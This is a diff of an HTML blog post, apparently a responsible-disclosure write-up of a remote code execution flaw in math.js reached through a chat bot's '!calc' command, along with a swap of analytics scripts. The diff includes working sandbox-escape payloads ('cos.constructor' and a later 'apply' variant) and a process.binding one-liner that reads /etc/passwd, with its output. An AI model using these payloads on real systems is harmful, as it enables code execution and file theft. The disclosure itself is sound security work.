@@ -75,14 +75,14 @@ Error: Undefined symbol Function</code></pre>
 </blockquote>
 <p>There are four standard ways to <strong>evaluate strings in JavaScript</strong>:</p>
 <ul>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval(&quot;code&quot;)</code></a></li>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>new Function(&quot;code&quot;)</code></a></li>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout"><code>setTimeout(&quot;code&quot;, timeout)</code></a></li>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval"><code>setInterval(&quot;code&quot;, interval)</code></a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval("code")</code></a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>new Function("code")</code></a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout"><code>setTimeout("code", timeout)</code></a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval"><code>setInterval("code", interval)</code></a></li>
 </ul>
 <p>In the math.js environment, these cannot be accessed directly, either because they aren’t defined or because they have been redefined with safe functions. However, they can be accessed indirectly: notably, <strong><code>Function</code> can be accessed indirectly as the constructor of an existing function</strong> - this was the key intuition that led to discovering the vulnerability.</p>
 <blockquote>
-<p>For example, <code>Function(&quot;return 1&quot;)</code> can be replaced with <code>Math.floor.constructor(&quot;return 1&quot;)</code>. Therefore, to evaluate <code>return 1</code>, we can use <code>Math.floor.constructor(&quot;return 1&quot;)()</code>.</p>
+<p>For example, <code>Function("return 1")</code> can be replaced with <code>Math.floor.constructor("return 1")</code>. Therefore, to evaluate <code>return 1</code>, we can use <code>Math.floor.constructor("return 1")()</code>.</p>
 </blockquote>
 <p>We know that in the math.js environment <code>cos</code> is defined as a function, so we used that:</p>
 <pre><code>&gt; !calc cos.constructor(&quot;return 1&quot;)()
@@ -114,9 +114,9 @@ Result: {
   &quot;NODE_HOME&quot;: &quot;/app/.heroku/node&quot;,
   &quot;_&quot;: &quot;/app/.heroku/node/bin/node&quot;
 }</code></pre>
-<p>Though <code>process.env</code> contains some bits of juicy info, it can’t really do anything interesting: we need to go deeper and use <a href="http://stackoverflow.com/q/24042861"><code>process.binding</code></a>, which exposes Javascript bindings to the OS. Though they are not officially documented and are meant for internal usage, one can reconstruct their behaviour from reading through the Node.js source code. For example, we can use <code>process.binding(&quot;fs&quot;)</code> to read arbitrary files on the OS (with the appropriate permissions):</p>
+<p>Though <code>process.env</code> contains some bits of juicy info, it can’t really do anything interesting: we need to go deeper and use <a href="http://stackoverflow.com/q/24042861"><code>process.binding</code></a>, which exposes Javascript bindings to the OS. Though they are not officially documented and are meant for internal usage, one can reconstruct their behaviour from reading through the Node.js source code. For example, we can use <code>process.binding("fs")</code> to read arbitrary files on the OS (with the appropriate permissions):</p>
 <blockquote>
-<p>For brevity, we’ll skip the <code>!calc cos.constructor(&quot;code&quot;)</code> wrapper, and paste the relevant JS code instead.</p>
+<p>For brevity, we’ll skip the <code>!calc cos.constructor("code")</code> wrapper, and paste the relevant JS code instead.</p>
 </blockquote>
 <pre><code>&gt; buffer = Buffer.allocUnsafe(8192); process.binding(&#39;fs&#39;).read(process.binding(&#39;fs&#39;).open(&#39;/etc/passwd&#39;, 0, 0600), buffer, 0, 4096); return buffer
 root:x:0:0:root:/root:/bin/bash
@@ -151,11 +151,11 @@ spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a
 <p>Now that we found a vulnerability and exploited it to the largest extent possible, we had to decide what to do with it. Since we exploited it for fun and have no malicious intents, we took the “white hat” road and reported it to the maintainer. We <strong>contacted him privately</strong> through the e-mail address listed on his GitHub profile with the following details:</p>
 <ul>
 <li>a short description of the vulnerability (a remote code execution flaw in mathjs.eval);</li>
-<li>an <strong>example attack</strong> with explanation of how it works (a summary of why <code>cos.constructor(&quot;code&quot;)()</code> works and what can be achieved with <code>process.bindings</code>);</li>
+<li>an <strong>example attack</strong> with explanation of how it works (a summary of why <code>cos.constructor("code")()</code> works and what can be achieved with <code>process.bindings</code>);</li>
 <li>an actual <strong>demonstration</strong> on the live server (we included the output of <code>whoami</code> and <code>uname -a</code>);</li>
 <li>suggestions on <strong>how to fix it</strong> (using the <a href="https://nodejs.org/api/vm.html"><code>vm</code> module in Node.js</a>, for example).</li>
 </ul>
-<p>Over a course of two days, we worked with the author to help fix the vulnerability. Notably, after he pushed a fix in <a href="https://github.com/josdejong/mathjs/commit/2f456009056bc332673f45ca143d4d92c8c7b159"><code>2f45600</code></a> we found a similar workaround (if you can’t use the constructor directly, use <code>cos.constructor.apply(null, &quot;code&quot;)()</code>) which was fixed in <a href="https://github.com/josdejong/mathjs/commit/3c3517daa6412457826b79b60368d8e8e415a7dd"><code>3c3517d</code></a>.</p>
+<p>Over a course of two days, we worked with the author to help fix the vulnerability. Notably, after he pushed a fix in <a href="https://github.com/josdejong/mathjs/commit/2f456009056bc332673f45ca143d4d92c8c7b159"><code>2f45600</code></a> we found a similar workaround (if you can’t use the constructor directly, use <code>cos.constructor.apply(null, "code")()</code>) which was fixed in <a href="https://github.com/josdejong/mathjs/commit/3c3517daa6412457826b79b60368d8e8e415a7dd"><code>3c3517d</code></a>.</p>
 <h3 id="timeline">Timeline</h3>
 <ul>
 <li>26 March 2017 22:20 CEST: first successful exploitation</li>
@@ -170,19 +170,19 @@ spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a
 <p><small>Released under <a href="https://creativecommons.org/licenses/by/4.0/"><strong>CC-BY 4.0</strong></a>.</p>
 </blockquote>
 <script type="text/javascript">
-  // Self-hosted Piwik tracking
-  var _paq = _paq || [];
-  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
-  _paq.push(['trackPageView']);
-  _paq.push(['enableLinkTracking']);
-  (function() {
-    var u="//matomo.jwlss.pw/";
-    _paq.push(['setTrackerUrl', u+'piwik.php']);
-    _paq.push(['setSiteId', '1']);
-    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
-  })();
+var owa_baseUrl = 'https://owa.jwlss.pw/';
+var owa_cmds = owa_cmds || [];
+owa_cmds.push(['setSiteId', 'f2e9ee8a9891964269889d383908ca8c']);
+owa_cmds.push(['trackPageView']);
+owa_cmds.push(['trackClicks']);
+owa_cmds.push(['trackDomStream']);
+
+(function() {
+  var _owa = document.createElement('script'); _owa.type = 'text/javascript'; _owa.async = true;
+  owa_baseUrl = ('https:' == document.location.protocol ? window.owa_baseSecUrl || owa_baseUrl.replace(/http:/, 'https:') : owa_baseUrl );
+  _owa.src = owa_baseUrl + 'modules/base/js/owa.tracker-combined-min.js';
+  var _owa_s = document.getElementsByTagName('script')[0]; _owa_s.parentNode.insertBefore(_owa, _owa_s);
+}());
 </script>
-<noscript><p><img src="//matomo.jwlss.pw/piwik.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p></noscript>
 </body>
 </html>
